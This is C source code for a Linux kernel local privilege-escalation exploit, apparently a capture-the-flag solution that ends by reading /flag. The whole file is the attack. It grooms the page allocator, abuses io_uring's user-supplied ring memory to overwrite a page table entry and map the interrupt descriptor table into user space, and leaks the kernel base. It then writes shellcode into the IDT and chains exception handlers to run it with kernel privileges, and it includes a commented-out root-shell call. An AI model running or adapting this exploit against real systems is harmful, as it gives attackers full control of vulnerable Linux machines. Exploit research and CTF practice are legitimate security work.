#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sys/mman.h>

#include <linux/io_uring.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

typedef unsigned long ul;

#define PAGE_SIZE 					0x1000
#define PROT_ALL 					PROT_READ | PROT_WRITE | PROT_EXEC

#define PAGE_MASK 					(~(PAGE_SIZE-1))
#define PAGE_ALIGN(x) 				((x + PAGE_SIZE - 1) & PAGE_MASK)
#define THP_MASK 					(~(0x200000-1))

#define SPRAY 						512

#define OFFSETOF_IO_RINGS_CQES 		0x40
#define OFFSETOF_IO_URING_SQE_UD	0x20

#define SQ_ADDR 					0x111000
#define CQ_ADDR 					0x122000
#define SQ_PAGES					8
#define SQ_SIZE						SQ_PAGES * PAGE_SIZE
#define SQ_ENTRIES					(SQ_SIZE / sizeof(struct io_uring_sqe))
#define CQ_PAGES					PAGE_ALIGN(SQ_ENTRIES * 2 * sizeof(struct io_uring_cqe) + OFFSETOF_IO_RINGS_CQES) / PAGE_SIZE
#define CQ_SIZE						CQ_PAGES * PAGE_SIZE

#define IDT							0x200000				// THP-aligned address

#define INTERRUPT_DESCRIPTOR_SIZE	0x10
#define DIV_ERROR_IDX				0
#define INVALID_OP_IDX				6
#define GPF_IDX						13

#define ASM_EXC_DIVIDE_ERROR		0x1600950
#define SWAPGS_SYSRET				0x16001db
#define SET_MEMORY_X				0x1599b0

#define IDT_FIXED_ADDRESS			0xfffffe0000000000
#define SHELLCODE_OFFSET			0x800					// just a random offset with a lot of empty entries

ul kbase;
char* idt;
void* idt_backup;
char shellcode[] = {0x48, 0x8b, 0x2c, 0x24, 0x48, 0x81, 0xed, 0x41, 0x75, 0x15, 0x00, 0x48, 0x8d, 0xbd, 0xc0, 0x2e, 0xc7, 0x02, 0x48, 0x8d, 0x85, 0x60, 0xc2, 0x1f, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x85, 0x60, 0xfe, 0x1e, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x48, 0x8d, 0xb5, 0xe0, 0x29, 0xc7, 0x02, 0x48, 0x8d, 0x85, 0x60, 0x9f, 0x1f, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0xbd, 0x00, 0xd9, 0xda, 0x02, 0x48, 0x8d, 0x85, 0x40, 0x7c, 0x4f, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0xbf, 0x63, 0x63, 0x63, 0x63, 0x48, 0x8d, 0x85, 0x60, 0xfe, 0x1e, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x10, 0x08, 0x00, 0x00, 0x6a, 0x2b, 0x48, 0xb8, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x50, 0x68, 0x06, 0x02, 0x00, 0x00, 0x6a, 0x33, 0x48, 0xb8, 0x62, 0x62, 0x62, 0x62, 0x62, 0x62, 0x62, 0x62, 0x50, 0x0f, 0x01, 0xf8, 0x48, 0xcf};


void leak(char* what, unsigned long where){
	printf("%s @ %p\n", what, (void*) where);
}

void pin_cpu(int core){
	cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(core, &cpu);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu);
}

void win(){
	memcpy(idt, idt_backup, PAGE_SIZE);

	char flag[0x100];
	int fd = open("/flag", O_RDONLY);
	read(fd, flag, sizeof(flag));
	puts(flag);

	/* char *args[] = {"/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);*/

	while(1){}
}

void setup(){
	pin_cpu(0);

	unshare(CLONE_NEWUSER);
	unshare(CLONE_NEWNET);

	ul stack;
	*(ul*) memmem(shellcode, sizeof(shellcode), "aaaaaaaa", 8) = (ul) &stack;
	*(ul*) memmem(shellcode, sizeof(shellcode), "bbbbbbbb", 8) = (ul) &win;
	*(int*) memmem(shellcode, sizeof(shellcode), "cccc", 4) = (int) getpid();
}

void set_handler(char* addr, unsigned long val, unsigned long ist){
	/* 0x8e0000100000: 
		P: 1
		DPL: 0
		type: 0xe	(trap gate)
		ist: /
		segment selector: 0x10
		offset15:0: /
	*/
    unsigned long tmp = 0x8e0000100000 | (ist << 32);				
    tmp += val & 0xffff;
    tmp += ((val >> 16) & 0xffff) << 48; 
    
    *(unsigned long*) addr = tmp;
    *(unsigned long*) &addr[8] = val >> 32;
}

void spray_n_pages(int fds[][2], int n){
	for (int i=0; i<n; i++){
		pipe(&fds[i]);
		write(fds[i][1], "", 1);
		close(fds[i][0]);				// don't waste fds
	}
}

void socket_init_rx_ring(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv,
                                unsigned int timeout) {
	int v = TPACKET_V3;
	setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
}

int setup_socket(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv,
                        int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	socket_init_rx_ring(s, block_size, frame_size, block_nr, sizeof_priv,
								timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	bind(s, (struct sockaddr *)&sa, sizeof(sa));
	return s;
}

void* mmap_n_contiguous_pages(int n, void* addr){
	n--;
	int fds[n];

	// high chance that it will reclaim a n-order page
	fds[0] = setup_socket(PAGE_SIZE, 2048, n, 0, 100000);
	mmap(addr, PAGE_SIZE*n, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE, fds[0], 0);

	// return page to buddy as order-0 -> n contiguous pages on top of the freelist
	close(fds[0]);
	munmap(addr, PAGE_SIZE*n);

	// reclaim them in reverse order because of buddy's LIFO policy
	for (int i=n-1; i>=0; i--){
		fds[i] = setup_socket(PAGE_SIZE, 2048, 1, 0, 100000);
		mmap(addr + i*PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE, fds[i], 0);
	}

	// first and last page must be mapped to the same physical page: https://github.com/thejh/linux/blob/b219722eaea721e7ddc86aa68bdb864d78c4347b/io_uring/io_uring.c#L2721
	mmap(addr + n*PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE, fds[0], 0);

	// close fds to easily return pages to buddy when needed (through munmap)
	for (int i=0; i<n; i++)
		close(fds[i]);

	return addr;
}

ul feng_shui(ul addr, int n){
	int* fds[SPRAY][2];
	mmap((addr & THP_MASK) + 0x10000, PAGE_SIZE, PROT_ALL, 							// + 0x10000: mmap_min_address
		MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);				// make sure that pmd is already allocated

	// increase chances of contiguous pages because of the split-based nature of the buddy
	spray_n_pages(&fds, SPRAY);

	return mmap_n_contiguous_pages(n, addr);
}

void iop(){
	// backup original IDT
	idt_backup = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	memcpy(idt_backup, idt, PAGE_SIZE);

	// write shellcode on IDT (most of the entries are empty)
	memcpy(idt + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));

	// write IOPchain
	/*
		div by 0 -> swapgs; sysret -> 
		GPF (rcx non canonical) -> set_memory_x(idt_fixed_address, 1) ->
		ud2 -> IDT -> shellcode
	*/

	set_handler(&idt[INTERRUPT_DESCRIPTOR_SIZE * DIV_ERROR_IDX], kbase + SWAPGS_SYSRET, 0);			
	set_handler(&idt[INTERRUPT_DESCRIPTOR_SIZE * GPF_IDX], kbase + SET_MEMORY_X, 0);
	set_handler(&idt[INTERRUPT_DESCRIPTOR_SIZE * INVALID_OP_IDX], IDT_FIXED_ADDRESS + SHELLCODE_OFFSET, 0);

	// registers won't be changed, so we control sysret and set_memory_x parameters
	// start IOPchain with div rax (rax == 0)
	asm volatile (
        ".intel_syntax noprefix\n"
		"mov rdi, %0\n"
		"mov rsi, 1\n"
		"mov rcx, 0x800000000000\n"				// non-canonical address in order to make sysret throw gpf
        "mov rax, 0\n"
		"div rax\n"
        ".att_syntax prefix"
        :
        : "r" (IDT_FIXED_ADDRESS)
        : "rax"
    );
}

ul leak_zeropfn(){
	// allocate physical contiguous pages for submission and completion queues
	ul sq = feng_shui(SQ_ADDR, SQ_PAGES);
	ul cq = feng_shui(CQ_ADDR, CQ_PAGES);

	// free boffed unmoveable page + remap address not to make pin_user_pages_fast fail
	munmap(sq+PAGE_SIZE, PAGE_SIZE);
	mmap(sq+PAGE_SIZE, PAGE_SIZE, PROT_ALL, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

	// mmap PMD containing zeropfn
	mmap(IDT + OFFSETOF_IO_URING_SQE_UD / 8 * PAGE_SIZE, PAGE_SIZE, PROT_READ, 
		MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);					
		// OFFSETOF_IO_URING_SQE_UD / 8 * PAGE_SIZE: align the pte with offsetof(struct io_uring_sqe, user_data)

	// *&rings->sq.tail = ctx->sq_entries
  	*(volatile unsigned int *)(cq + 4) = SQ_ENTRIES;

	struct io_uring_params params = {
		.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY,
		.sq_off = {.user_addr = sq},
		.cq_off = {.user_addr = cq}};
	int uring_fd = syscall(__NR_io_uring_setup, SQ_ENTRIES, &params);

	puts("[!] debug 3");

	// consume first sq page + 1 entry which will overlap with PMD -> zero_pfn
	memset(sq, 0, SQ_SIZE);
	for (int i=0; i<PAGE_SIZE / sizeof(struct io_uring_sqe) + 1; i++)
		syscall(__NR_io_uring_enter, uring_fd, 1, 0, 0, 0);
	
	ul zero_pfn = ((*(ul*) (cq + 
		(PAGE_SIZE / sizeof(struct io_uring_sqe)) *
		(sizeof(struct io_uring_cqe)) + OFFSETOF_IO_RINGS_CQES)) & PAGE_MASK) << 1 >> 1;

	leak("zero_pfn", zero_pfn);

	// free PMD to hijack
	munmap(IDT + OFFSETOF_IO_URING_SQE_UD / 8 * PAGE_SIZE, PAGE_SIZE);

	return zero_pfn;
}

void map_idt(ul zero_pfn){
	// allocate physical contiguous pages for submission and completion queues 
	ul sq = feng_shui(SQ_ADDR, SQ_PAGES);
	ul cq = feng_shui(CQ_ADDR, CQ_PAGES);

	// free boffed unmoveable page + remap address not to make pin_user_pages_fast fail
	munmap(cq+PAGE_SIZE, PAGE_SIZE);
	mmap(cq+PAGE_SIZE, PAGE_SIZE, PROT_ALL, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

	// allocate PMD to hijack
	idt = mmap(IDT, PAGE_SIZE, PROT_READ | PROT_WRITE, 
		MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	
	// *&rings->sq.tail = ctx->sq_entries
  	*(volatile unsigned int *)(cq + 4) = SQ_ENTRIES;
	
	struct io_uring_params params2 = {
		.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY,
		.sq_off = {.user_addr = sq},
		.cq_off = {.user_addr = cq}};
	int uring_fd = syscall(__NR_io_uring_setup, SQ_ENTRIES, &params2);

	// consume first cq page
	memset(sq, 0, SQ_SIZE);
	int sqe;
	for (sqe=0; sqe<(PAGE_SIZE-OFFSETOF_IO_RINGS_CQES) / sizeof(struct io_uring_cqe); sqe++)
		syscall(__NR_io_uring_enter, uring_fd, 1, 0, 0, 0);
		
	// write on PMD
	((struct io_uring_sqe*) sq)[sqe].user_data = 
		zero_pfn+0x1000 | 0x8000000000000067;	// + 0x1000: IDT is mapped right after zero_pfn
												// 0x8000000000000067: pte flags: NX | DIRTY | ACCESSED | W | U | P
	syscall(__NR_io_uring_enter, uring_fd, 1, 0, 0, 0);
}

void leak_kaslr(){
	kbase = 0xffffffff00000000;
	kbase += *(uint16_t*) idt;
    kbase += (*(unsigned int*) &idt[6] & 0xffff) << 16;
    kbase -= ASM_EXC_DIVIDE_ERROR;
	leak("kbase", kbase);
}

int main(int argc, char **argv) {
	puts("[!] debug 1");

	setup();
	puts("[!] debug 2");

	ul zero_pfn = leak_zeropfn();
	map_idt(zero_pfn);
	leak_kaslr();

	if (kbase & (~THP_MASK)){
		puts("[!] didn't work, try again");
		exit(-1);
	}
	
	iop();
}
